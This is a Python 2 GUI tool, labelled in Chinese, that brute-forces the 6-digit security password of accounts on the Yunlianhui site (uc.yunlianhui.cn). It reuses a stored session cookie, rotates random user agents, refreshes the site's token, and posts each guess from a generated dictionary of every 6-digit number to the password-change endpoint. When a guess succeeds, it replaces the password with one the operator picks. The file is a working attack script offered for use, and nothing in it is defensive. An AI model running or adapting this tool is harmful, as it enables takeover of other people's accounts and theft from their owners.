#!/usr/bin/python
#-*- coding: utf-8 -*-
import sys
reload(sys)
sys.setdefaultencoding("utf-8")
import urllib2, random, time
import json
import requests
import itertools as its
from Tkinter import *
import thread

class YlhGUI:
    def __init__(self):
        #获取配置文件
        [initPwd, newPwd] = self.getConfig()
        #创建窗口
        self.main_window = Tk()
        #设置title与窗体大小
        self.main_window.title('扫密')
        self.main_window.geometry('600x480')
        self.main_window.resizable(width=True, height=True)

        #起始密码、设定密码与扫密按钮
        topFrame = LabelFrame(self.main_window, text="云联惠扫密")
        topFrame.pack(fill='both')

        #起始密码
        Label(topFrame, text="起始密码").grid(row=0)
        self.initPwd = Entry(topFrame)
        self.initPwd.insert(0, initPwd)
        self.initPwd.grid(row=0, column=1)

        # 扫密按钮
        self.btn = Button(topFrame, text="扫密", command=self.startBruterPwd)
        self.btn.pack(side=RIGHT)
        self.btn.grid(row=0, column=2)
        self.alert = Text(topFrame, height=1)
        self.alert.pack()
        self.alert.grid(row=0, column=3)

        #设定密码
        Label(topFrame, text="设定密码").grid(row=1)
        self.setPwd = Entry(topFrame)
        self.setPwd.insert(0, newPwd)
        self.setPwd.grid(row=1, column=1)

        #中断按钮
        btn = Button(topFrame, text="退出", command=self.stopBruterPwd)
        btn.pack(side=RIGHT)
        btn.grid(row=1, column=2)

        #扫密日志
        bottomFrame = LabelFrame(self.main_window, text="扫密日志")
        bottomFrame.pack(fill='both')
        self.log = Text(bottomFrame, wrap='none',borderwidth=2)
        self.log.pack()

        mainloop()

    def getConfig(self):
        fp = open('./init.config','r')
        line = fp.readline()
        [initPwd,setPwd] = line.strip().split(':')
        fp.close()
        return [initPwd,setPwd]

    def writeConfig(self, initPwd, setPwd):
        fp = open('./init.config', 'w')
        line = initPwd + ':' + setPwd
        fp.write(line)
        fp.close()

    def doBruterPwd(self, lines, initPwd, setPwd, ylh):
        for line in lines:
            oldPwd = line.strip()
            if oldPwd >= initPwd:
                time.sleep(3)
                ylh.refreshToken(ylh.token)
                [data, code] = ylh.changeSafePwd(oldPwd, setPwd)
                rtn = '尝试密码：' + oldPwd + '; 测试结果：' + data + '\r\n'
                self.writeConfig(oldPwd, setPwd)
                if code == 0:
                    rtn = '尝试密码：' + oldPwd + '; 测试结果：密码修改成功; 旧安全密码 ：' + oldPwd + '新安全密码 ：' + setPwd + '\r\n'
                    self.writeRunLog(rtn)
                    break
                else:
                    self.writeRunLog(rtn)
                    continue

    def startBruterPwd(self):
        self.btn.config(state=DISABLED)
        self.alert.insert('1.0', '系统运行中')
        self.alert.update()
        initPwd = self.initPwd.get()
        setPwd = self.setPwd.get()
        fp = open('./pass.txt', 'r')
        lines = fp.readlines()
        ylh = YLH()
        #self.td = BruterThread('bt',lines, initPwd, setPwd, ylh, self.log)
        #self.td.start()
        thread.start_new_thread(self.doBruterPwd,(lines, initPwd, setPwd, ylh))
        fp.close()

    def stopBruterPwd(self):
        thread.exit_thread()


    def writeRunLog(self, msg):
        self.log.insert('1.0', msg)
        self.log.update()

class YLH:
    def __init__(self):
        self.safePwdUrl = 'http://uc.yunlianhui.cn/index.php/MFile/ajax_safePwdAlter.html'
        self.refreshTokenUrl = 'http://uc.yunlianhui.cn/index.php/MFile/ajax_RefreshToken.html'
        self.referer = 'http://uc.yunlianhui.cn/index.php/MFile/safeAlter.html'
        self.cookie = self.getCookie()
        self.user_agents = list()
        self.load_user_agents()
        self.token = ''

    def load_user_agents(self):
        fp = open('./user_agents', 'r')
        lines  = fp.readlines()
        for line in lines:
            self.user_agents.append(line.strip('\n'))
        fp.close()

    def getHeaders(self):
        user_agents = self.user_agents
        length = len(user_agents)
        user_agent = user_agents[random.randint(0, length - 1)]
        headers = {
            'User-agent': user_agent,
            'connection': 'keep-alive',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type' : 'application/x-www-form-urlencoded;charset = UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'X-Requested-With': 'XMLHttpRequest',
            'Pragma' : 'no-cache',
            'Origin' : 'http://uc.yunlianhui.cn',
            'referer': self.referer,
            'cookie' : self.cookie
        }
        return headers

    def refreshToken(self, oldToken):
        postData = {'ajax':1,'oldToken':oldToken}
        try:
            headers = self.getHeaders()
            response = requests.post(url=self.refreshTokenUrl, headers=headers, data=postData)
            try:
                token = json.loads(response.content)['data']
            except Exception, e:
                self.writeYlhLog('error:' + str(e))
                token = ''
            self.token = token
        except urllib2.URLError, e:
            self.writeYlhLog('error:' + str(e))
        except Exception, e:
            self.writeYlhLog('error:' + str(e))
        return True

    def changeSafePwd(self, oldPwd, setPwd):
        postData = {'ajax': 1, 'token':self.token ,'oldPwd': oldPwd, 'pwd':setPwd, 'checkPwd':setPwd}
        respData = ''
        respCode = 1
        try:
            headers = self.getHeaders()
            response = requests.post(url=self.safePwdUrl, headers=headers, data=postData)
            try:
                respJson = json.loads(response.content)
                respData = respJson['data']
                respCode = respJson['err']
            except Exception,e:
                self.writeYlhLog('error:' + str(e))
                respData = response.content
                respCode = 1
            return [respData, respCode]
        except urllib2.URLError, e:
            self.writeYlhLog('error:' + str(e))
        except Exception, e:
            self.writeYlhLog('error:' + str(e))
        return [respData, respCode]

    def getCookie(self):
        fp = open('cookie.txt','r')
        lines = fp.readlines()
        cookie = ''
        for line in lines:
            cookie = cookie + line
        return cookie

    def  makeDict(self):
        words = "0123456879"
        r = its.product(words, repeat=6)
        dic = open("pass.txt", "a")
        for i in r:
            dic.write("".join(i))
            dic.write("".join("\n"))
        dic.close()

    def writeYlhLog(self, msg):
        fp = open('log.txt', 'a')
        fp.write(msg+'\r\n')
        fp.close()

if __name__ == '__main__':
    ylhGUI = YlhGUI()

